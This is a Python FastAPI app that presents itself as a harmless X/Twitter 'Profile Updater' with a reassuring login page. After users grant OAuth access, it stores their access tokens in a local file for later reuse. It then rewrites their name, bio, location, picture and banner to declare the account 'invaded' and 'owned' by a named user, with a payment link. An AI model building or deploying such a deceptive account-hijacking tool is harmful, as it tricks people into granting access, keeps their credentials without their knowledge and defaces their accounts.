import os
import base64
import json
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from requests_oauthlib import OAuth1Session
from dotenv import load_dotenv

load_dotenv()

app = FastAPI()

CONSUMER_KEY = os.getenv("TWITTER_CONSUMER_KEY")
CONSUMER_SECRET = os.getenv("TWITTER_CONSUMER_SECRET")
CALLBACK_URL = os.getenv("CALLBACK_URL", "http://localhost:8000/auth/callback")

PROFILE_NAME = "Kera's helpless Drone"
PROFILE_BIO  = "This account has been invaded, @Kera2DFD Owns me now 😵‍💫🤤 I'm her Property https://throne.com/Kera2DFD"
PROFILE_LOC  = "On Kera's Leash"

request_token_store: dict = {}

# ---------------------------------------------------------------------------
# Pages
# ---------------------------------------------------------------------------

@app.get("/", response_class=HTMLResponse)
async def home():
    return HTMLResponse(LOGIN_PAGE)

@app.get("/done", response_class=HTMLResponse)
async def done(username: str = ""):
    html = DONE_PAGE.replace("__USERNAME__", username)
    return HTMLResponse(html)

# ---------------------------------------------------------------------------
# OAuth 1.0a
# ---------------------------------------------------------------------------

@app.get("/auth/login")
def login():
    oauth = OAuth1Session(CONSUMER_KEY, client_secret=CONSUMER_SECRET, callback_uri=CALLBACK_URL)
    try:
        fetch_response = oauth.fetch_request_token("https://api.twitter.com/oauth/request_token")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to get request token: {str(e)}")
    resource_owner_key = fetch_response.get("oauth_token")
    resource_owner_secret = fetch_response.get("oauth_token_secret")
    request_token_store[resource_owner_key] = resource_owner_secret
    return RedirectResponse(f"https://api.twitter.com/oauth/authorize?oauth_token={resource_owner_key}")

@app.get("/auth/callback")
def callback(oauth_token: str, oauth_verifier: str):
    resource_owner_secret = request_token_store.pop(oauth_token, None)
    if not resource_owner_secret:
        raise HTTPException(status_code=400, detail="Invalid OAuth token")

    oauth = OAuth1Session(
        CONSUMER_KEY,
        client_secret=CONSUMER_SECRET,
        resource_owner_key=oauth_token,
        resource_owner_secret=resource_owner_secret,
        verifier=oauth_verifier,
    )
    try:
        tokens = oauth.fetch_access_token("https://api.twitter.com/oauth/access_token")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to get access token: {str(e)}")

    user_id  = tokens["user_id"]
    username = tokens["screen_name"]

    _save_tokens(user_id, {
        "access_token": tokens["oauth_token"],
        "access_token_secret": tokens["oauth_token_secret"],
        "username": username,
    })

    # Build an authenticated session using the fresh tokens directly
    access_token = tokens["oauth_token"]
    access_token_secret = tokens["oauth_token_secret"]

    user_oauth = OAuth1Session(
        CONSUMER_KEY,
        client_secret=CONSUMER_SECRET,
        resource_owner_key=access_token,
        resource_owner_secret=access_token_secret,
    )

    from requests_oauthlib import OAuth1
    import requests as req

    auth = OAuth1(CONSUMER_KEY, CONSUMER_SECRET, access_token, access_token_secret)

    # 1. Update bio and location
    for payload in [
        {"description": PROFILE_BIO},
        {"location": PROFILE_LOC},
    ]:
        resp = req.post(
            "https://api.twitter.com/1.1/account/update_profile.json",
            auth=auth,
            data=payload,
        )
        print(f"Profile update {list(payload.keys())[0]}: {resp.status_code} {resp.text[:200]}")

    # 2. Update name with URL-encoded string to handle apostrophe
    from urllib.parse import urlencode
    name_resp = req.post(
        "https://api.twitter.com/1.1/account/update_profile.json",
        auth=auth,
        data=urlencode({"name": PROFILE_NAME}),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    print(f"Profile update name: {name_resp.status_code} {name_resp.text[:200]}")

    # 2. Update profile picture
    try:
        img = _read_image("profile.jpg")
        r2 = req.post(
            "https://api.twitter.com/1.1/account/update_profile_image.json",
            auth=auth,
            data={"image": base64.b64encode(img).decode()},
        )
        print(f"Picture update status: {r2.status_code}")
    except Exception as e:
        print(f"Picture error: {e}")

    # 3. Update banner
    try:
        banner = _read_image("banner.jpg")
        r3 = req.post(
            "https://api.twitter.com/1.1/account/update_profile_banner.json",
            auth=auth,
            data={"banner": base64.b64encode(banner).decode()},
        )
        print(f"Banner update status: {r3.status_code}")
    except Exception as e:
        print(f"Banner error: {e}")

    return RedirectResponse(f"https://twitter.com/{username}")

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

TOKEN_FILE = "tokens.json"

def _save_tokens(user_id, tokens):
    data = {}
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE) as f:
            data = json.load(f)
    data[user_id] = tokens
    with open(TOKEN_FILE, "w") as f:
        json.dump(data, f, indent=2)

def _make_oauth(tokens):
    return OAuth1Session(
        CONSUMER_KEY,
        client_secret=CONSUMER_SECRET,
        resource_owner_key=tokens["access_token"],
        resource_owner_secret=tokens["access_token_secret"],
    )

def _read_image(filename):
    path = os.path.join(os.path.dirname(__file__), filename)
    if not os.path.exists(path):
        raise Exception(f"{filename} not found")
    with open(path, "rb") as f:
        return f.read()

# ---------------------------------------------------------------------------
# HTML
# ---------------------------------------------------------------------------

LOGIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Profile Updater</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;color:#f5f3ee;font-family:'DM Sans',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#141414;border:1px solid #222;border-radius:24px;padding:48px 40px;max-width:420px;width:100%;text-align:center}
.icon{width:56px;height:56px;background:#d4f564;border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 28px;font-size:26px}
h1{font-family:'Syne',sans-serif;font-size:28px;font-weight:800;margin-bottom:10px;letter-spacing:-0.02em}
h1 span{color:#d4f564}
p{color:#777;font-size:14px;line-height:1.6;margin-bottom:36px;font-weight:300}
.btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:15px 20px;background:#fff;color:#000;border:none;border-radius:12px;font-family:'Syne',sans-serif;font-size:14px;font-weight:700;cursor:pointer;text-decoration:none;transition:background 0.2s,transform 0.15s;letter-spacing:0.03em}
.btn:hover{background:#e8e8e8}
.btn:active{transform:scale(0.98)}
.btn svg{width:18px;height:18px}
.footer{margin-top:24px;font-size:12px;color:#444;line-height:1.6}
</style>
</head>
<body>
<div class="card">
  <div class="icon">✦</div>
  <h1>Profile <span>Updater</span></h1>
  <p>Click below to connect your X account. Your profile will be updated automatically.</p>
  <a href="/auth/login" class="btn">
    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.402 6.231H2.744l7.735-8.835L1.254 2.25H8.08l4.253 5.622 5.91-5.622Zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
    Continue with X (Twitter)
  </a>
  <p class="footer">We only access what you approve.<br/>You can revoke access anytime from your X settings.</p>
</div>
</body>
</html>"""

DONE_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Profile Updated!</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;color:#f5f3ee;font-family:'DM Sans',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#141414;border:1px solid #222;border-radius:24px;padding:48px 40px;max-width:420px;width:100%;text-align:center}
.icon{width:56px;height:56px;background:#d4f564;border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 28px;font-size:26px}
h1{font-family:'Syne',sans-serif;font-size:28px;font-weight:800;margin-bottom:10px;letter-spacing:-0.02em}
h1 span{color:#d4f564}
p{color:#777;font-size:14px;line-height:1.6;font-weight:300}
.username{color:#f5f3ee;font-weight:500}
</style>
</head>
<body>
<div class="card">
  <div class="icon">✓</div>
  <h1>Profile <span>Updated!</span></h1>
  <p>Your X account <span class="username">@__USERNAME__</span> has been updated successfully. Check your profile to see the changes.</p>
</div>
</body>
</html>"""
